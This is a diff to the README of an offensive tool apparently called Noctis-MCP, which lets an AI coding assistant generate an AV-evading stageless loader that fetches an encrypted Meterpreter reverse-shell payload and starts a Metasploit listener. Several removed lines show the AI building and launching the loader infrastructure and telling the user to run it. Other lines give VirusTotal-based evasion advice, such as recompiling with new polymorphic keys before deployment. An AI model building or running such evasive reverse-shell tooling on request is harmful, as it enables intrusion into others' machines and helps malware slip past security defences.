@@ -139,7 +139,7 @@ Add this to your MCP config (update the path to match your installation):
 
 In Cursor, just ask:
 ```
-"Generate stageless loader for 192.xxx.x.x:4444"
+"Generate stageless loader for 10.10.10.100:4444"
 ```
 
 The AI will:
@@ -210,105 +210,22 @@ noctis_stop_servers()
 # - Metasploit listener
 ```
 
-### 5. `noctis_test_binary(file_path)` - Optional Development Tool
-**Test binary against VirusTotal (70+ AV engines)**
+### 5. `noctis_test_binary(file_path)`
+**Test binary against VirusTotal (70+ AV engines) - Optional**
 
-**Configuration Required:**
-```bash
-# Get free API key: https://www.virustotal.com/gui/my-apikey
-# Add to .env: VIRUSTOTAL_API_KEY=your_key_here
-```
-
-**WARNING:** Only use during development when improving stealth. VirusTotal shares samples with AV vendors!
+**Setup:** Get free API key from https://www.virustotal.com/gui/my-apikey and add to `.env`
 
 ```python
 noctis_test_binary("/path/to/stageless_loader.exe")
 
-# Returns detailed report:
-# ======================================================================
-#   VIRUSTOTAL SCAN RESULTS
-# ======================================================================
-# File: stageless_loader.exe
-# SHA256: a1b2c3d4...
-# Detection Rate: 3/72 engines
-#
-# [WARNING] LOW detection - Good stealth, minor flags
-#
-# ======================================================================
-#   DETECTION BREAKDOWN BY ENGINE
-# ======================================================================
-# Engines that DETECTED (3):
-#   [DETECTED] MicrosoftDefender    -> Trojan:Win32/Meterpreter
-#   [DETECTED] AVG                  -> Generic.Malware
-#   [DETECTED] Avast                -> Win32:Malware-gen
-#
-# Engines that passed (69):
-#   [CLEAN]    CrowdStrike
-#   [CLEAN]    SentinelOne
-#   [CLEAN]    Sophos
-#   ... and 66 more
-#
-# ======================================================================
-#   OPSEC WARNING
-# ======================================================================
-# This binary is now in VirusTotal's database and shared
-# with AV vendors. Do NOT reuse this exact binary.
-# Recompile with new polymorphic keys before deployment.
+# Shows:
+# - Detection rate (e.g., 3/72 engines)
+# - Which AVs detected it and their signatures
+# - Which AVs passed
+# - Permalink to full report
 ```
 
-**Use when:**
-- Loader is getting detected, need to identify which AVs
-- Testing evasion technique improvements
-- Comparing different polymorphic variations
-
-**Free API Limits:** 4 requests/min, 500/day (perfect for testing)
-
----
-
-## Complete Usage Example
-
-### In Cursor with AI:
-
-```
-YOU: Generate stageless loader for 10.10.10.100:4444
-
-AI: I'll generate and set up everything automatically...
-
-[AI calls: noctis_generate_stageless_loader("10.10.10.100", 4444, 8080)]
-
-STAGELESS LOADER GENERATED!
-
-LHOST: 10.10.10.100
-LPORT: 4444
-HTTP Port: 8080
-
-Generated files:
-  stageless_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
-  payload.enc (203,264 bytes) - RC4 encrypted
-  start_server.sh - HTTP server script
-  start_listener.sh - Metasploit listener script
-
-STARTING SERVERS AUTOMATICALLY...
-
-HTTP Server: RUNNING on port 8080
-   Serving: http://localhost:8080/payload.enc
-   PID: 12345
-
-Metasploit Listener: RUNNING
-   Listening: 10.10.10.100:4444
-   Payload: windows/x64/meterpreter_reverse_tcp
-   PID: 12346
-
-READY TO TEST!
-
-Next steps:
-  1. Copy /path/to/stageless_loader.exe to Windows VM
-  2. Run the loader on Windows
-  3. Watch Metasploit for incoming session!
-
-AI: Done! Everything is running. The servers are started in the background.
-Just copy the loader to your Windows VM and run it!
-```
+**WARNING:** Only use during development. VirusTotal shares samples with AV vendors. Never upload production binaries.
 
 ---
 
@@ -346,7 +263,7 @@ Noctis-MCP/
 │   └── __init__.py
 │
 ├── noctis_mcp/
-│   └── noctis_tools.py        # 4 MCP tools for Cursor integration
+│   └── noctis_tools.py        # 5 MCP tools for Cursor integration
 │
 ├── stageless-loader/          # Stageless loader system
 │   ├── stageless_loader.c     # Clean loader source (NO MSFVenom)
@@ -387,27 +304,11 @@ Use `noctis_stop_servers()` to cleanly shut them down.
 
 ### VirusTotal Testing (Optional)
 
-**For development/stealth improvement only:**
+For development only. Use `noctis_test_binary()` to test against 70+ AV engines when your loader gets detected.
 
-When your loader starts getting detected and you need to identify which AV engines are flagging it:
+**Setup:** Get free API key from https://www.virustotal.com/gui/my-apikey and add to `.env`
 
-```bash
-# In Cursor, ask:
-"Test my stageless_loader.exe against VirusTotal"
-
-# Results show:
-# - Detection rate (e.g., 3/72 engines)
-# - Which specific AVs detected it
-# - What signatures they flagged
-# - Permalink to full report
-```
-
-**Use cases:**
-- Loader getting detected, need to know which AVs
-- Testing evasion technique improvements
-- Comparing polymorphic variations
-
-**OPSEC Warning:** VirusTotal shares samples with AV vendors. Only use during development. Never upload production binaries. Always recompile with new polymorphic keys after testing.
+**OPSEC Warning:** VirusTotal shares samples with AV vendors. Never upload production binaries.
 
 ---
 
